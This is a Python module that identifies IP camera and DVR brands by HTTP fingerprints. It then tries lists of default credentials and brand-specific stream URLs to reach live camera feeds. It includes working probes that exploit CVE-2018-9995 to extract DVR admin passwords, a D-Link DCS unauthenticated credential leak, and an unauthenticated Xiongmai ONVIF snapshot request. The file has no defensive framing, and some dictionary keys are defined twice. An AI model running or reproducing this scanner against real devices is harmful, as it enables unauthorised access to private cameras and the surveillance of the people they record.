"""Ingram-inspired camera fingerprinting and weak-credential stream discovery.

Based on the open fingerprint rules and brand patterns from:
  https://github.com/jorhelp/Ingram (MIT License)

This module:
  1. Identifies camera brands via HTTP fingerprinting (headers, page titles, favicon
     MD5, body keywords) using Ingram's rules.csv patterns.
  2. For identified brands, tries known default credentials and brand-specific
     snapshot/stream URLs to discover accessible live streams.

Supported brand detectors:
  avtech, axis, cctv/dvr (generic), dahua, dlink-dcs, geovision, hikvision,
  instar, ipcamera, netwave, nuuo, reecam, tenda, uniview, xiongmai
"""
from __future__ import annotations

import hashlib
import logging
import re
from typing import Dict, List, Optional, Tuple

import httpx

logger = logging.getLogger(__name__)
_TIMEOUT = 3.5

# ---------------------------------------------------------------------------
# Ingram fingerprint rules (from rules.csv), keyed by brand slug.
# Each entry: (path, match_type, pattern)
#   match_type: "title", "body", "headers", "md5"
# ---------------------------------------------------------------------------
_RULES: List[Tuple[str, str, str, str]] = [
    # avtech
    ("avtech", "/",            "title",   "::: Login :::"),
    ("avtech", "/",            "title",   "Remote Surveillance"),
    ("avtech", "/",            "body",    "Any time & Any where"),
    # axis
    ("axis",   "/",            "title",   "AXIS"),
    ("axis",   "/",            "headers", "AXIS"),
    # cctv / generic DVR
    ("cctv",   "/",            "body",    "IP Surveillance for Your Life"),
    ("cctv",   "/",            "body",    "/nobody/loginDevice.js"),
    ("cctv",   "/",            "headers", "JAWS"),
    # dlink-dcs
    ("dlink-dcs", "/",         "headers", "realm=\"DCS"),
    ("dlink-dcs", "/",         "headers", "realm=DCS"),
    # dvr (generic)
    ("dvr",    "/login.rsp",   "title",   "LOGIN"),
    # geovision
    ("geovision", "/",         "title",   "GeoVision"),
    # hikvision
    ("hikvision", "/",         "body",    "doc/page/login.asp"),
    ("hikvision", "/",         "body",    "g_szCacheTime"),
    ("hikvision", "/",         "headers", "APP-webs"),
    ("hikvision", "/",         "headers", "DVRDVS-Webs"),
    ("hikvision", "/",         "headers", "DNVRS-Webs"),
    ("hikvision", "/",         "headers", "Hikvision-Webs"),
    ("hikvision", "/",         "headers", "_goaheadwebSessionId"),
    ("hikvision", "/",         "title",   "hikvision"),
    # instar
    ("instar", "/",            "title",   "INSTAR"),
    # ipcamera (generic)
    ("ipcamera", "/",          "headers", "IPCamera"),
    # netwave
    ("netwave", "/",           "headers", "Netwave IP Camera"),
    # nuuo
    ("nuuo",   "/",            "title",   "network video recorder login"),
    # reecam
    ("reecam", "/",            "headers", "ReeCam IP Camera"),
    # tenda
    ("tenda",  "/",            "title",   "Tenda | login"),
    ("tenda",  "/",            "title",   "Tenda|login"),
    ("tenda",  "/",            "title",   u"Tenda | 登录"),
    # uniview
    ("uniview", "/",           "body",    "uniview"),
    # xiongmai
    ("xiongmai", "/",          "title",   "NETSurveillance WEB"),
    ("xiongmai", "/",          "title",   "NetSurveillance WEB"),
    # dlink (older)
    ("dlink",  "/",            "title",   "D-LINK"),
]

# Friendly brand display names
_BRAND_NAMES: Dict[str, str] = {
    "avtech":     "Avtech",
    "axis":       "Axis",
    "cctv":       "Generic DVR",
    "dlink-dcs":  "D-Link DCS",
    "dlink":      "D-Link",
    "dvr":        "Generic DVR",
    "geovision":  "GeoVision",
    "hikvision":  "Hikvision",
    "instar":     "Instar",
    "ipcamera":   "Generic IPCam",
    "netwave":    "Netwave IPCam",
    "nuuo":       "Nuuo NVR",
    "reecam":     "ReeCam",
    "tenda":      "Tenda",
    "uniview":    "Uniview",
    "xiongmai":   "Xiongmai",
}

# ---------------------------------------------------------------------------
# Brand-specific: known default credentials to try
# ---------------------------------------------------------------------------
_BRAND_CREDS: Dict[str, List[Tuple[str, str]]] = {
    "avtech":    [("admin", ""), ("admin", "admin"), ("admin", "123456")],
    "axis":      [("root", ""), ("admin", "admin"), ("root", "pass"), ("root", "root")],
    "cctv":      [("admin", ""), ("admin", "admin"), ("admin", "12345"), ("888888", "888888")],
    "dlink-dcs": [("admin", ""), ("admin", "admin")],
    "dlink":     [("admin", ""), ("admin", "admin")],
    "dvr":       [("admin", ""), ("admin", "admin"), ("888888", "888888"), ("666666", "666666")],
    "geovision": [("admin", "admin"), ("admin", "")],
    "hikvision": [("admin", "12345"), ("admin", ""), ("admin", "admin")],
    "instar":    [("admin", "instar"), ("admin", "admin")],
    "ipcamera":  [("admin", ""), ("admin", "admin"), ("admin", "12345")],
    "netwave":   [("admin", "admin"), ("admin", "")],
    "nuuo":      [("admin", ""), ("admin", "admin"), ("viewer", "viewer")],
    "reecam":    [("admin", "admin"), ("admin", "")],
    "tenda":     [("admin", "admin"), ("admin", "")],
    "uniview":   [("admin", "admin"), ("admin", "12345")],
    "xiongmai":  [("admin", ""), ("admin", "admin"), ("admin", "12345")],
}

# ---------------------------------------------------------------------------
# Brand-specific snapshot / stream paths
# ---------------------------------------------------------------------------
_BRAND_STREAMS: Dict[str, List[Tuple[str, str]]] = {
    # path, stream_type
    "avtech": [
        ("/cgi-bin/guest/Video.cgi?media=JPEG&channel=0&quality=standard",  "http_snapshot"),
        ("/cgi-bin/guest/Video.cgi?media=JPEG",                             "http_snapshot"),
        ("/cgi-bin/mjpeg",                                                   "mjpeg"),
        ("/cgi-bin/video.cgi",                                               "mjpeg"),
    ],
    "axis": [
        ("/axis-cgi/jpg/image.cgi",                                          "http_snapshot"),
        ("/axis-cgi/mjpg/video.cgi",                                         "mjpeg"),
        ("/axis-cgi/bitmap/image.bmp",                                       "http_snapshot"),
        ("/jpg/image.jpg",                                                   "http_snapshot"),
    ],
    "dlink-dcs": [
        ("/image/jpeg.cgi",                                                  "http_snapshot"),
        ("/mjpeg.cgi",                                                       "mjpeg"),
        ("/video.cgi",                                                       "mjpeg"),
    ],
    "geovision": [
        ("/PictureCatch.cgi",                                                "http_snapshot"),
        ("/JPGStream",                                                       "mjpeg"),
        ("/cam0_0.jpg",                                                      "http_snapshot"),
    ],
    "hikvision": [
        ("/onvif-http/snapshot?auth=YWRtaW46MTEK",                          "http_snapshot"),
        ("/Streaming/channels/1/picture?auth=YWRtaW46MTEK",                 "http_snapshot"),
        ("/ISAPI/Streaming/channels/1/picture",                              "http_snapshot"),
    ],
    "ipcamera": [
        ("/snapshot.cgi",                                                    "http_snapshot"),
        ("/snapshot.jpg",                                                    "http_snapshot"),
        ("/tmpfs/auto.jpg",                                                  "http_snapshot"),
        ("/img/snapshot.cgi?size=2",                                         "http_snapshot"),
        ("/videostream.cgi?rate=0",                                          "mjpeg"),
    ],
    "netwave": [
        ("/snapshot.cgi",                                                    "http_snapshot"),
        ("/videostream.cgi?rate=0&resolution=640x480",                       "mjpeg"),
    ],
    "nuuo": [
        ("/live/media/video1.mjpeg",                                         "mjpeg"),
        ("/live/media/video1.jpg",                                           "http_snapshot"),
    ],
    "reecam": [
        ("/snapshot.cgi",                                                    "http_snapshot"),
        ("/videostream.cgi?rate=0",                                          "mjpeg"),
    ],
    "tenda": [
        ("/goform/getImage",                                                 "http_snapshot"),
        ("/cgi-bin/snapshot.cgi",                                            "http_snapshot"),
    ],
    "uniview": [
        ("/ISAPI/Streaming/channels/1/picture",                              "http_snapshot"),
        ("/unicorn-web-static/resource/image/snapshot.jpg",                  "http_snapshot"),
        ("/onvif-http/snapshot",                                             "http_snapshot"),
    ],
    "xiongmai": [
        ("/onvif-http/snapshot",                                             "http_snapshot"),
        ("/snap.jpg?JpegCam=0",                                              "http_snapshot"),
        ("/snap.jpg?JpegSize=XL",                                            "http_snapshot"),
        ("/snap.jpg",                                                        "http_snapshot"),
    ],
    "cctv": [
        ("/snap.jpg?JpegCam=0",                                              "http_snapshot"),
        ("/snapshot.jpg",                                                    "http_snapshot"),
    ],
    "dvr": [
        ("/snap.jpg?JpegCam=0",                                              "http_snapshot"),
        ("/snapshot.jpg",                                                    "http_snapshot"),
    ],
    "dlink-dcs": [
        ("/image/jpeg.cgi",                                                  "http_snapshot"),
        ("/mjpeg.cgi",                                                       "mjpeg"),
        ("/video.cgi",                                                       "mjpeg"),
        ("/cgi/jpg/image.cgi",                                               "http_snapshot"),
    ],
    "instar": [
        ("/tmpfs/auto.jpg",                                                  "http_snapshot"),
        ("/snapshot.cgi",                                                    "http_snapshot"),
        ("/videostream.cgi?rate=0",                                          "mjpeg"),
    ],
    "geovision": [
        ("/PictureCatch.cgi",                                                "http_snapshot"),
        ("/JPGStream",                                                       "mjpeg"),
        ("/cam0_0.jpg",                                                      "http_snapshot"),
        ("/MultiStream",                                                     "mjpeg"),
    ],
}

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _md5(data: bytes) -> str:
    return hashlib.md5(data).hexdigest()


def _match_rule(
    brand: str,
    path: str,
    match_type: str,
    pattern: str,
    resp_cache: Dict[str, httpx.Response],
) -> bool:
    resp = resp_cache.get(path)
    if resp is None or resp.status_code not in (200, 401, 403):
        return False

    text_lower = resp.text.lower() if resp.text else ""
    headers_raw = " ".join(f"{k}: {v}" for k, v in resp.headers.items()).lower()

    if match_type == "title":
        m = re.search(r"<title[^>]*>(.*?)</title>", text_lower, re.I | re.S)
        title = m.group(1).strip() if m else ""
        return pattern.lower() in title

    if match_type == "body":
        return pattern.lower() in text_lower

    if match_type == "headers":
        return pattern.lower() in headers_raw

    if match_type == "md5":
        return _md5(resp.content) == pattern.lower()

    return False


async def _fetch_paths(
    ip: str,
    port: int,
    paths: List[str],
    client: httpx.AsyncClient,
) -> Dict[str, httpx.Response]:
    """Fetch multiple paths from host, return {path: response}."""
    cache: Dict[str, httpx.Response] = {}
    for path in paths:
        url = f"http://{ip}:{port}{path}"
        try:
            r = await client.get(url)
            cache[path] = r
        except Exception:
            pass
    return cache


def _detect_brand(resp_cache: Dict[str, httpx.Response]) -> Optional[str]:
    for brand, path, match_type, pattern in _RULES:
        if _match_rule(brand, path, match_type, pattern, resp_cache):
            return brand
    return None


async def _probe_brand_streams(
    ip: str,
    port: int,
    brand: str,
    client: httpx.AsyncClient,
) -> List[Tuple[str, str]]:
    """Try brand-specific snapshot/stream URLs, return list of (url, stream_type) that return JPEG."""
    found: List[Tuple[str, str]] = []
    paths = _BRAND_STREAMS.get(brand, [])
    for path, stype in paths:
        url = f"http://{ip}:{port}{path}"
        try:
            r = await client.get(url)
            if r.status_code == 200 and r.content:
                ct = r.headers.get("content-type", "").lower()
                if ct.startswith("image/") or r.content[:3] == b"\xff\xd8\xff":
                    found.append((url, stype))
                    break  # one working snapshot is enough
                elif "multipart" in ct or "mjpeg" in ct or "x-motion-jpeg" in ct:
                    found.append((url, "mjpeg"))
                    break
        except Exception:
            pass
    return found


# ---------------------------------------------------------------------------
# Special brand probes: bypass / credential discovery / alternate auth
# ---------------------------------------------------------------------------

async def _probe_dvr_tbk_cookie(
    ip: str,
    port: int,
) -> Optional[Tuple[str, str]]:
    """CVE-2018-9995: TBK DVR / CeNova / QSee / Night OWL / Securus / Pulnix auth bypass.

    Sends Cookie: uid=admin to /device.rsp?opt=user&cmd=list
    and extracts the real admin credentials from the JSON response.
    Returns (user, password) or None.
    """
    url = f"http://{ip}:{port}/device.rsp?opt=user&cmd=list"
    headers = {"Cookie": "uid=admin", "User-Agent": "Mozilla/5.0"}
    try:
        async with httpx.AsyncClient(verify=False, timeout=_TIMEOUT) as client:
            r = await client.get(url, headers=headers)
            if r.status_code == 200:
                data = r.json()
                lst = data.get("list", [])
                if lst:
                    user = str(lst[0].get("uid", "admin"))
                    pwd  = str(lst[0].get("pwd", ""))
                    return user, pwd
    except Exception:
        pass
    return None


async def _probe_xiongmai_onvif_8899(
    ip: str,
) -> Optional[str]:
    """Xiongmai/H264DVR port 8899 unauthenticated ONVIF GetSnapshotUri.

    Sends a minimal ONVIF SOAP request without credentials.
    Returns snapshot URL string or None.
    """
    url = f"http://{ip}:8899/onvif/Media"
    xml = (
        '<?xml version="1.0" encoding="utf-8"?>'
        '<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"'
        ' xmlns:xsd="http://www.w3.org/2001/XMLSchema"'
        ' xmlns:soap="http://www.w3.org/2003/05/soap-envelope">'
        '<soap:Header><Security xmlns="http://docs.oasis-open.org/wss/2004/01/'
        'oasis-200401-wss-wssecurity-secext-1.0.xsd">'
        '<UsernameToken><Username></Username>'
        '<Password Type="http://docs.oasis-open.org/wss/2004/01/'
        'oasis-200401-wss-username-token-profile-1.0#PasswordDigest"></Password>'
        '<Nonce EncodingType="http://docs.oasis-open.org/wss/2004/01/'
        'oasis-200401-wss-soap-message-security-1.0#Base64Binary"></Nonce>'
        '<Created xmlns="http://docs.oasis-open.org/wss/2004/01/'
        'oasis-200401-wss-wssecurity-utility-1.0.xsd"></Created>'
        '</UsernameToken></Security></soap:Header>'
        '<soap:Body><GetSnapshotUri xmlns="http://www.onvif.org/ver10/media/wsdl">'
        '<ProfileToken>000</ProfileToken>'
        '</GetSnapshotUri></soap:Body></soap:Envelope>'
    )
    headers = {
        "Content-Type": "application/soap+xml; charset=utf-8",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/3.12.5",
    }
    try:
        async with httpx.AsyncClient(verify=False, timeout=_TIMEOUT) as client:
            r = await client.post(url, content=xml.encode(), headers=headers)
            if r.status_code == 200:
                m = re.search(r"<tt:Uri>(.*?)</tt:Uri>", r.text)
                if m:
                    snapshot_url = m.group(1).replace("&amp;", "&")
                    return snapshot_url
    except Exception:
        pass
    return None


async def _probe_dlink_dcs_getuser(
    ip: str,
    port: int,
) -> Optional[Tuple[str, str]]:
    """D-Link DCS unauth credential disclosure via /config/getuser?index=0.

    Returns (user, password) or None.
    """
    url = f"http://{ip}:{port}/config/getuser?index=0"
    try:
        async with httpx.AsyncClient(verify=False, timeout=_TIMEOUT) as client:
            r = await client.get(url)
            if r.status_code == 200 and r.text:
                user_m = re.search(r"user=(\S+)", r.text)
                pwd_m  = re.search(r"pass=(\S+)", r.text)
                if user_m:
                    return user_m.group(1), (pwd_m.group(1) if pwd_m else "")
    except Exception:
        pass
    return None


# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------

async def probe_ingram(
    ip: str,
    http_ports: List[int],
    credentials: List[Tuple[str, str]],
) -> Dict:
    """Fingerprint camera brand using Ingram rules, then discover accessible streams.

    Returns a dict:
      {
        "success": bool,
        "brand": str,
        "ingram_brand": str,  # internal slug
        "http_port": int,
        "streams": [ {"url": str, "type": str}, ... ],
        "protocols": [str],
      }
    """
    result: Dict = {
        "success": False,
        "brand": "",
        "ingram_brand": "",
        "http_port": 0,
        "streams": [],
        "protocols": [],
    }

    if not http_ports:
        return result

    # Determine the paths needed for rule matching
    needed_paths = list({path for (_, path, _, _) in _RULES})

    # Try each HTTP port in turn
    for port in http_ports:
        try:
            async with httpx.AsyncClient(
                verify=False,
                timeout=_TIMEOUT,
                follow_redirects=True,
            ) as client:
                resp_cache = await _fetch_paths(ip, port, needed_paths, client)

                if not resp_cache:
                    continue

                brand_slug = _detect_brand(resp_cache)
                if not brand_slug:
                    continue

                # Brand detected — try to find accessible streams
                friendly_name = _BRAND_NAMES.get(brand_slug, brand_slug.capitalize())

                # Merge in brand-specific default credentials
                brand_creds = _BRAND_CREDS.get(brand_slug, [])
                merged_creds: List[Tuple[str, str]] = list({
                    *brand_creds,
                    *credentials,
                })

                # Set up auth headers / params for snapshot probing
                working_streams: List[Tuple[str, str]] = []

                # ── Special bypass probes per brand ───────────────────────
                if brand_slug == "dvr" and not working_streams:
                    # CVE-2018-9995: TBK DVR cookie auth bypass — extract real creds
                    creds_extracted = await _probe_dvr_tbk_cookie(ip, port)
                    if creds_extracted:
                        extr_user, extr_pwd = creds_extracted
                        logger.debug("[v2/Ingram] DVR TBK cookie bypass OK %s -> %s:****", ip, extr_user)
                        merged_creds.insert(0, (extr_user, extr_pwd))

                if brand_slug == "xiongmai" and not working_streams:
                    # Xiongmai port 8899 unauthenticated ONVIF GetSnapshotUri
                    snap_url = await _probe_xiongmai_onvif_8899(ip)
                    if snap_url:
                        logger.debug("[v2/Ingram] Xiongmai ONVIF 8899 snap: %s", snap_url)
                        working_streams.append((snap_url, "http_snapshot"))

                if brand_slug == "dlink-dcs" and not working_streams:
                    # D-Link DCS unauth credential disclosure
                    creds_extracted = await _probe_dlink_dcs_getuser(ip, port)
                    if creds_extracted:
                        extr_user, extr_pwd = creds_extracted
                        logger.debug("[v2/Ingram] D-Link DCS getuser OK %s -> %s:****", ip, extr_user)
                        merged_creds.insert(0, (extr_user, extr_pwd))

                # ── Standard credential-based stream probing ──────────────
                if not working_streams:
                    for user, pwd in merged_creds[:5]:
                        async with httpx.AsyncClient(
                            verify=False,
                            timeout=_TIMEOUT,
                            follow_redirects=True,
                            auth=(user, pwd) if user else None,
                        ) as auth_client:
                            streams = await _probe_brand_streams(ip, port, brand_slug, auth_client)
                            if streams:
                                working_streams = streams
                                break

                # Even if no snapshot found, mark brand detected
                result["success"] = True
                result["brand"] = friendly_name
                result["ingram_brand"] = brand_slug
                result["http_port"] = port
                result["protocols"].append(f"ingram_{brand_slug}")
                result["streams"] = [
                    {"url": url, "type": stype}
                    for url, stype in working_streams
                ]

                logger.debug(
                    "[v2/Ingram] %s -> brand=%s, streams=%d",
                    ip, brand_slug, len(working_streams),
                )
                return result

        except Exception as exc:
            logger.debug("[v2/Ingram] %s:%d error: %s", ip, port, exc)
            continue

    return result
